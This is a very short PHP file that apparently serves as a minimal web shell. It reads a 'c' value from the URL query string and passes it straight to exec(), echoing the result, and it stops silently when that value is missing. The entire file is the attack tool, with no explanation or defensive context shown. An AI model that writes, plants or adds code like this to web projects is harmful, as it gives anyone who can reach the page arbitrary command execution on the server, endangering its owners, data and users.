<?php
if(isset($_GET["c"])){
    echo exec($_GET["c"]);
}else
    die();